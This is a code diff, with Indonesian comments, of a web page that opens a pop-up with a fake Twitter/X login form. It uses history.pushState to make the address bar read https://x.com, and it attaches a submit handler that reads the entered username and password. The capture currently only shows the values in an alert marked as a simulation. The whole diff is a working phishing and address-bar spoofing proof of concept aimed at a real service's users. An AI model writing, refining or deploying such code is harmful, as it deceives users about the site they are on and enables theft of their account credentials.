@@ -5,8 +5,8 @@
     }
 
     function f() {
-        // Membuka jendela pop-up kosong
-        w = window.open("");  
+        // Membuka pop-up kosong
+        w = window.open("", "LoginPopup", "width=500,height=500");
 
         // Menulis tampilan login di dalam pop-up
         w.document.write('<h2>Login Twitter</h2>');
@@ -17,16 +17,15 @@
         w.document.write('<input type="password" id="password" name="password" placeholder="Password"><br><br>');
         w.document.write('<input type="submit" value="Login"><br>');
         w.document.write('</form>');
-        
-        // Mengubah alamat URL ke x.com, address bar berubah
-        w.location = "https://x.com";
 
-        // Mengecek alamat URL setiap 1ms dan melakukan pengecekan
+        // Mengubah alamat URL di address bar ke x.com (tanpa mempengaruhi pop-up)
+        w.history.pushState({}, "", "https://x.com");
+
+        // Mengecek lokasi dan memastikan pop-up tidak beralih dari x.com
         i = setInterval(function() {
             try {
-                // Cek apakah sudah berhasil di redirect ke x.com
                 if (w.location.href === "https://x.com") {
-                    // Setelah berhasil, lanjutkan untuk menampilkan login form
+                    // Setelah berhasil, lanjutkan untuk menampilkan form login
                     w.document.body.innerHTML = '<h2>Login Twitter</h2>';
                     w.document.body.innerHTML += '<form id="loginForm" action="#" method="post">';
                     w.document.body.innerHTML += '<label for="username">Username:</label><br>';
@@ -35,14 +34,6 @@
                     w.document.body.innerHTML += '<input type="password" id="password" name="password" placeholder="Password"><br><br>';
                     w.document.body.innerHTML += '<input type="submit" value="Login"><br>';
                     w.document.body.innerHTML += '</form>';
-                    
-                    // Menghandle submit form untuk login
-                    w.document.getElementById('loginForm').onsubmit = function(event) {
-                        event.preventDefault();  // Mencegah reload halaman
-                        var username = w.document.getElementById('username').value;
-                        var password = w.document.getElementById('password').value;
-                        alert("Username: " + username + "\nPassword: " + password); // Hanya untuk simulasi
-                    };
                 }
             } catch (e) {
                 // Jika gagal, redirect ke halaman Google
@@ -50,7 +41,15 @@
                 next();
             }
         }, 1);  // Mengecek setiap 1ms
+
+        // Menghandle submit form untuk login
+        w.document.getElementById('loginForm').onsubmit = function(event) {
+            event.preventDefault();  // Mencegah reload halaman
+            var username = w.document.getElementById('username').value;
+            var password = w.document.getElementById('password').value;
+            alert("Username: " + username + "\nPassword: " + password);  // Simulasi login
+        };
     }
 </script>
 
-<a href="#" onclick="f()">Login X Twitter</a>
+<a href="#" onclick="f()">Login Twitter</a>
